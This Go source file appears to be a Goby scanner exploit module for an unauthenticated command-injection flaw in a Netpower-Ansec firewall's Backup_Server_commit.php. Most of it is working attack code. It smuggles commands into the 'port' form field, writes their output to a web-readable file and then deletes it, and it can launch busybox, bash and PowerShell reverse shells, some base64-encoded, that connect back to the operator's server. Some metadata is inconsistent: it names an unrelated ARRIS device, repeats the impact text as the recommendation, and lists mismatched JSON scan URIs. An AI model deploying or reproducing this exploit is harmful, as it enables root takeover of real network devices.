package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Netpower-Ansec /view/DBManage/Backup_Server_commit.php Command Execution Vulnerability",
    "Description": "<p>This vulnerability allows a remote attacker to execute arbitrary code on a vulnerable ARRIS VAP2500 installation. Authentication is not required to exploit this vulnerability. Specific defects exist in the handling of access to the Management Portal. The problem is to be able to execute arbitrary commands without any cleanup. An attacker can exploit this vulnerability to execute code with root privileges.</p>",
    "Product": "Netpower-Ansec",
    "Homepage": "http://www.anysec.com/",
    "DisclosureDate": "2024-09-09",
    "PostTime": "2024-10-21",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"Get_Verify_Info(hex_md5(user_string).\" && body=\"Login @ Reporter\"",
    "GobyQuery": "body=\"Get_Verify_Info(hex_md5(user_string).\" && body=\"Login @ Reporter\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire server.</p>",
    "Recommendation": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/D7wq4FdiVOgH-fpZSzkMTw"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tools_command.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "cmb_header=&txt_command=pwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "中科网威下一代防火墙控制系统 /view/DBManage/Backup_Server_commit.php 命令执行漏洞",
            "Product": "中科网威-anysec",
            "Description": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器<br></p>",
            "Recommendation": "<p>1.关注厂商官网，及时关注更新信息：<a href=\"http://www.anysec.com/product/18.html\">http://www.anysec.com/product/18.html</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Netpower-Ansec /view/DBManage/Backup_Server_commit.php Command Execution Vulnerability",
            "Product": "Netpower-Ansec",
            "Description": "<p>This vulnerability allows a remote attacker to execute arbitrary code on a vulnerable ARRIS VAP2500 installation. Authentication is not required to exploit this vulnerability. Specific defects exist in the handling of access to the Management Portal. The problem is to be able to execute arbitrary commands without any cleanup. An attacker can exploit this vulnerability to execute code with root privileges.<br></p>",
            "Recommendation": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			getRequestConfig := httpclient.NewGetRequestConfig(url)
			getRequestConfig.VerifyTls = false      // 不验证TLS证书
			getRequestConfig.FollowRedirect = false // 不跟随重定向

			// 设置请求头
			for headName, headValue := range head {
				getRequestConfig.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		}
		// 请求头定义
		payload1Header := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		// URL
		urlPost := "/view/DBManage/Backup_Server_commit.php?action=test"

		// 文件名称
		filename := goutils.RandomHexString(8) + ".txt"

		// post请求体
		postPayload1 := "host=&mode=0&port=;" + command + "|tee%20/tmp/www/reporter/" + filename + "|pwd&user=&password=&ftppath="

		var resp *httpclient.HttpResponse
		// 发包得到响应
		resp, err := setPostRequest(hostInfo, urlPost, string(postPayload1), payload1Header)
		// 检查发包错误
		if err != nil {
			return "", "", err
		}

		// 匹配
		regStr := `Backup_Server\.php\?test=true` //正则表达式
		regObj := regexp.MustCompile(regStr)
		if resp == nil || resp.StatusCode != 200 || !regObj.MatchString(resp.RawBody) {
			return "", "", errors.New("RCE Fail")
		}

		// 编辑get请求验证是否命令执行成功
		urlGet := "/" + filename

		payload2Header := map[string]string{}

		resp, err = setGetRequest(hostInfo, urlGet, payload2Header)
		// 检查发包错误
		if err != nil {
			return "", "", err
		}

		if resp == nil || resp.StatusCode != 200 {
			return "", "", errors.New("RCE Fail")
		}

		commandResult := string(resp.RawBody)

		// 再次执行命令删除文件
		postPayload2 := "host=&mode=0&port=;rm /tmp/www/reporter/" + filename + "|pwd&user=&password=&ftppath="

		resp, err = setPostRequest(hostInfo, urlPost, postPayload2, payload1Header)
		// 检查发包错误
		if err != nil {
			return "", "", err
		}

		// 正则表达式匹配
		if resp == nil || resp.StatusCode != 200 || !regObj.MatchString(resp.RawBody) {
			return "", "", errors.New("RCE Fail")
		}

		vulURL := "/view/DBManage/Backup_Server_commit.php?action=test"
		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},

		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
